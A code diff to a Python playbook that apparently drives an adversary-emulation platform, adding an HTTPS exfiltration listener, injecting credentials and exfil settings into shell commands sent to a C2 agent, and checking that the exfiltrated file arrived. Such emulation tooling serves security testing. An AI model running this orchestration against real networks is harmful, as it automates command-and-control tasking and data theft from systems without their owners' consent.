@@ -54,6 +54,7 @@ exfil_type = config.get('exfil_task', 'exfil_type')
 exfil_port = config.get('exfil_task', 'exfil_port')
 exfil_outfile = config.get('exfil_task', 'exfil_outfile')
 exfil_task_domain_name = config.get('exfil_task', 'domain_name')
+exfil_subj = config.get('exfil_task', 'subj')
 command_list = config.get('c2_task', 'command_list')
 remote_ad_task_name = config.get('remote_ad_task', 'task_name')
 ad_tld = config.get('remote_ad_task', 'ad_tld')
@@ -68,6 +69,7 @@ c2_agent_name = config.get('c2_task', 'agent_name')
 
 exfil_task_exists = None
 exfil_portgroup_exists = None
+exfil_service_exists = None
 
 def get_task_target_ip(tn):
     task_details = h.get_task(tn)
@@ -238,14 +240,26 @@ print(f'\nIP - {exfil_task_ip}')
 print(f'\nHost name - {exfil_task_host_name}')
 print(f'\nDomain name - {exfil_task_domain_name}')
 
-# Setup exfil method.
-exfil_method = None
-if exfil_type == 'http-get':
-    exfil_method = 'exfilkit.methods.http.param_cipher.GETClient'
-if exfil_type == 'http-post':
-    exfil_method = 'exfilkit.methods.http.param_cipher.POSTClient'
-if exfil_type == 'dns':
-    exfil_method = 'exfilkit.methods.dns.subdomain_cipher.Client'
+# Use a random string for the exfil_listener instruct_instance.
+exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
+
+# Ask the exfil_task to start an exfil listener service.
+print(f'\nStarting an exfil listener service on {exfil_task_name}.')
+instruct_args = {'port': int(exfil_port), 'subj': exfil_subj}
+instruct_command = 'start_https_exfil_server'
+h.instruct_task(exfil_task_name, exfil_instruct_instance, instruct_command, instruct_args)
+
+# Get the start_https_exfil_server command results.
+start_exfil_server_results = get_command_results(exfil_task_name, instruct_command, exfil_instruct_instance)
+for se_result in start_exfil_server_results:
+    if se_result['instruct_command'] == instruct_command and se_result['instruct_instance'] == exfil_instruct_instance:
+        instruct_command_output = json.loads(se_result['instruct_command_output'])
+        if instruct_command_output['outcome'] == 'success':
+            print('\nstart_https_exfil_server succeeded.\n')
+            exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
+        else:
+            print('\nstart_https_exfil_server failed... Exiting.\n')
+            clean_up()
 
 # Setup exfil host.
 if exfil_task_domain_name != 'None':
@@ -267,8 +281,9 @@ for command in command_list.split(', '):
     user_name_insert = re.sub('\$USER_NAME', user_name, domain_insert)
     user_password_insert = re.sub('\$USER_PASSWORD', user_password, user_name_insert)
     admin_password_insert = re.sub('\$ADMIN_PASSWORD', admin_password, user_password_insert)
-    exfil_method_insert = re.sub('\$EXFIL_METHOD', exfil_method, admin_password_insert)
-    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_method_insert)
+    exfil_outfile_insert = re.sub('\$EXFIL_OUTFILE', exfil_outfile, admin_password_insert)
+    exfil_type_insert = re.sub('\$EXFIL_TYPE', exfil_type, exfil_outfile_insert)
+    exfil_host_insert = re.sub('\$EXFIL_HOST', exfil_host, exfil_type_insert)
     shell_command = re.sub('\$EXFIL_PORT', exfil_port, exfil_host_insert)
     print(f'\nTasking agent with agent_shell_command "{shell_command}"\n')
     # Use a random string for the agent instruct_instance of each shell command.
@@ -320,6 +335,31 @@ for command in command_list.split(', '):
     pse_task_status = get_task_status(c2_task_name)
     print(f'\n{c2_task_name} is now idle.')
     t.sleep(random.randrange(20))
+
+# Confirm that exfil was successful.
+# Use a random string for the exfil_listener instruct_instance.
+confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
+print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
+instruct_command = 'ls'
+h.instruct_task(exfil_task_name, confirm_exfil_instruct_instance, instruct_command)
+
+# Get the ls command results.
+ls_results = get_command_results(exfil_task_name, instruct_command, confirm_exfil_instruct_instance)
+for ls_result in ls_results:
+    if ls_result['instruct_command'] == instruct_command and ls_result['instruct_instance'] == confirm_exfil_instruct_instance:
+        instruct_command_output = json.loads(ls_result['instruct_command_output'])
+        if instruct_command_output['outcome'] == 'success':
+            dir_contents = instruct_command_output['local_directory_contents']
+            if exfil_outfile in dir_contents:
+                print(f'\nUpload of {exfil_outfile} succeeded.\n')
+                print(f'{exfil_task_name} local directory contents:\n')
+                pp.pprint(dir_contents)
+            else:
+                print(f'\nUpload of {exfil_outfile} failed.\n')
+                print(f'{exfil_task_name} local directory contents:\n')
+                pp.pprint(dir_contents)
+        else:
+            print(f'\nCould not list local directory contents for task {exfil_task_name}.\n')
 
 # Playbook is complete.
 print('\nPlaybook operation completed. Cleaning up...')
